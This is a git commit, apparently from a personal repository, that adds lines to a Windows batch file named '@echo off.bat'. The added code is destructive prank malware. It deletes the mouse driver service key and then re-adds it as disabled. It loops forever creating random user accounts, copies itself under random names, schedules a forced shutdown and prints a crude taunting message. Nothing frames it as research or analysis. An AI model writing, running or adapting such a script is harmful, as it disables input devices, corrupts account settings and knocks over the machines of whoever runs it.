fc6a3d47a3270aeec475c1711bfed092a7c30bfc
redcat607oficcial <101455968+redcat607oficcial@users.noreply.github.com>
2023-10-26 19:28:02 +0200

    Add files via upload

--- @echo off.bat
+++ @echo off.bat
@@ -1,4 +1,25 @@
-@echo off 
+@echo off
+rem ---------------------------------
+rem Disable Mouse
+set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
+reg delete %key%
+reg add %key% /v Start /t REG_DWORD /d 4
+rem ---------------------------------
+:loop
+:makeuser
+net user %random% %random% /add
+goto makeuser
+start 
+vol %random%
+copy %0 %random%%random%%random%.bat
+goto loop
+start shutdown.exe -s -t 120
+:boot
+echo hi. your pc been fucked by 122 
+start shutdown.exe -s -t 120 
+timeout /t 100 /nobreak
+copy con pito.bat
+    @echo off 
 rem ---------------------------------
 rem Disable Mouse
 set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
